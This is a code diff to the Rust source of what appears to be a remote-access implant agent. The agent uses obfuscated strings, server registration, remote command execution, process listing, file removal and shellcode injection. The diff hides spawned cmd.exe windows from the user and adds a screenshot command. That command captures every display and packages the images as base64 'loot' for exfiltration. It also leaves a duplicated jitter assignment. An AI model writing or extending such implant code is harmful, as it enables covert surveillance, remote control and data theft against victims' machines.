@@ -23,8 +23,11 @@ use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use sha2::Sha256;
 use std::time::{SystemTime, UNIX_EPOCH};
+use std::io::Cursor;
 use tokio::sync::Mutex;
 use uuid::Uuid;
+use screenshots::Screen;
+use image::ImageOutputFormat;
 
 type HmacSha256 = Hmac<Sha256>;
 
@@ -204,7 +207,7 @@ async fn register_agent(
 ) -> Result<(), Box<dyn std::error::Error>> {
     let reg = AgentRegistration {
         uuid: state.agent_id.clone(),
-        name: format!("{}-{}", obfstr!("A"), &state.agent_id[..8]),
+        name: state.agent_id.clone(),
         ip: get_local_ip(),
         os: get_os_info(),
         reconnect_interval: state.reconnect_interval,
@@ -317,7 +320,10 @@ async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint)
     } else if cmd_name == obfstr!("ps") {
         handle_ps(&args).await
     } else if cmd_name == obfstr!("exec") {
-        handle_exec(&args).await
+        if args.is_empty() {
+            return Err(obfstr!("invalid arguments").into());
+        }
+        exec_system_command(&args.join(" ")).await
     } else if cmd_name == obfstr!("reconnect") {
         handle_reconnect(&args, state).await
     } else if cmd_name == obfstr!("rm") {
@@ -328,13 +334,21 @@ async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint)
         handle_jitter(&args, state).await
     } else if cmd_name == obfstr!("injectsc") {
         Ok(inject::handle_inject_sc(&args)?)
+    } else if cmd_name == obfstr!("screenshot") {
+        handle_screenshot().await
     } else {
         exec_system_command(cmd).await
     }
 }
 
 async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    let output = ProcessCommand::new(obfstr!("cmd")).args(&[obfstr!("/C").as_str(), cmd]).output()?;
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x08000000;
+    
+    let output = ProcessCommand::new(obfstr!("cmd"))
+        .args(&[obfstr!("/C").as_str(), cmd])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()?;
     Ok(String::from_utf8_lossy(&output.stdout).to_string()
         + &String::from_utf8_lossy(&output.stderr).to_string())
 }
@@ -610,13 +624,6 @@ fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
     }
 }
 
-async fn handle_exec(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
-    if args.is_empty() {
-        return Err(obfstr!("invalid arguments").into());
-    }
-    exec_system_command(&args.join(" ")).await
-}
-
 async fn handle_reconnect(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
         return Ok(format!("{}", state.reconnect_interval));
@@ -670,7 +677,45 @@ async fn handle_jitter(args: &[String], state: &mut AgentState) -> Result<String
     }
 
     state.jitter_seconds = new_jitter;
+    state.jitter_seconds = new_jitter;
     Ok(obfstr!("ok"))
+}
+
+async fn handle_screenshot() -> Result<String, Box<dyn std::error::Error>> {
+    let screens = Screen::all()?;
+    let mut result = String::new();
+    let mut loot_entries = Vec::new();
+
+    for (i, screen) in screens.iter().enumerate() {
+        let image = screen.capture()?;
+        let mut buffer = Vec::new();
+        image.write_to(&mut Cursor::new(&mut buffer), ImageOutputFormat::Png)?;
+        
+        let timestamp = SystemTime::now()
+            .duration_since(UNIX_EPOCH)?
+            .as_secs();
+            
+        let filename = format!("screenshot_{}_{}.png", timestamp, i);
+        let hash = format!("{:x}", md5::compute(&buffer));
+        
+        let loot_entry = json!({
+            "type": "file",
+            "name": filename,
+            "path": "", // Empty path indicates loose file
+            "size": buffer.len(),
+            "content": general_purpose::STANDARD.encode(&buffer),
+            "md5": hash,
+        });
+        
+        loot_entries.push(loot_entry);
+        result.push_str(&format!("Captured screen {} ({} bytes)\n", i, buffer.len()));
+    }
+
+    if !loot_entries.is_empty() {
+        result.push_str(&format!("\n{}:{}", obfstr!("LOOT_ENTRIES"), serde_json::to_string(&loot_entries)?));
+    }
+
+    Ok(result)
 }
 
 fn clean_path(path: &Path) -> String {
